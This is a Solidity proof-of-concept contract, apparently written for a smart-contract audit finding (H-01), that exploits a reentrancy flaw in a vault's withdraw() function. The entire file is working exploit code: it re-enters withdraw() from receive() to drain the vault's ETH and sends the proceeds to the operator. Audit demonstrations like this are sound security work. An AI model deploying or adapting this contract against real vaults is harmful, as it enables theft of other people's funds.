// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

/**
 * Proof-of-concept attacker for Finding H-01 (Reentrancy in withdraw()).
 *
 * Flow:
 *   1. attack() deposits `depositAmount` and immediately calls withdraw().
 *   2. VulnerableVault sends ETH back BEFORE updating `balances`, so our
 *      receive() fires while our on-chain balance is still un-decremented.
 *   3. We call withdraw() again from inside receive(), and again, and
 *      again - each call passes the `balances[msg.sender] >= amount`
 *      check because the vault never got the chance to update its books.
 *   4. We stop once the vault is out of ETH (or we've done enough loops),
 *      then sweep our winnings back to the operator with collect().
 */
contract ReentrancyAttacker {
    IVault public immutable vault;
    address public owner;
    uint256 public depositAmount;
    uint256 public reentries;
    uint256 public maxReentries = 8;

    constructor(address _vault) {
        vault = IVault(_vault);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "not owner");
        depositAmount = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw(depositAmount);
    }

    receive() external payable {
        if (address(vault).balance >= depositAmount && reentries < maxReentries) {
            reentries += 1;
            vault.withdraw(depositAmount);
        }
    }

    function collect() external {
        require(msg.sender == owner, "not owner");
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}
